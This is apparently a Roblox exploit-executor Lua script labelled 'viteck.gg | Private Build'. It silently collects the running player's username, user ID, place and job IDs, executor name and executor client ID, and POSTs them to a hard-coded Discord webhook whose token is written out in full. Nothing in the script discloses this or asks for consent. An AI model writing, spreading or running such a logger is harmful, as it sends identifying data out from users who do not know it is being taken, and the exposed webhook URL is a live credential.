local http = syn and syn.request or request
local HttpService = game:GetService("HttpService")

local hwid = "none"
local executor = "none"
local client_id = "none"

local success_exec, result_exec = pcall(function()
    if getexecutorid then
        return getexecutorid()
    elseif identifyexecutor then
        return identifyexecutor()
    end
end)

if success_exec and result_exec then
    executor = result_exec
end

local success_cid, result_cid = pcall(function()
    if clientid then
        return clientid()
    elseif syn and syn.clientid then
        return syn.clientid()
    end
end)

if success_cid and result_cid then
    client_id = result_cid
end

local player = game.Players.LocalPlayer
local username = player.Name
local userId = player.UserId
local placeId = game.PlaceId
local jobId = game.JobId

local data = {
    ["content"] = "",
    ["embeds"] = {
        {
            ["title"] = "📌 Player info",
            ["color"] = 16711680, 
            ["fields"] = {
                {
                    ["name"] = "👤 Username",
                    ["value"] = username,
                    ["inline"] = true
                },
                {
                    ["name"] = "🆔 UserID",
                    ["value"] = tostring(userId),
                    ["inline"] = true
                },
                {
                    ["name"] = "🌍 PlaceID",
                    ["value"] = tostring(placeId),
                    ["inline"] = true
                },
                {
                    ["name"] = "🔗 JobID",
                    ["value"] = jobId,
                    ["inline"] = false
                },
                {
                    ["name"] = "🧷  Executor",
                    ["value"] = executor,
                    ["inline"] = false
                },
                {
                    ["name"] = "🔑 Client ID",
                    ["value"] = client_id,
                    ["inline"] = false
                }
            },
            ["footer"] = {
                ["text"] = "viteck.gg | Private Build",
                ["icon_url"] = "https://cdn.discordapp.com/emojis/1069386111237763133.webp?size=96&quality=lossless"
            }
        }
    }
}

http({
    Url = "https://discord.com/api/webhooks/1339239859184861286/tPcvy_EuDPL5cEt4kqkVdeM9wGSqFMCCYnaQkHeo0L-ets8TGpHl3J_OyPrFOcK-bOrT",
    Method = "POST",
    Headers = {["Content-Type"] = "application/json"},
    Body = HttpService:JSONEncode(data)
})
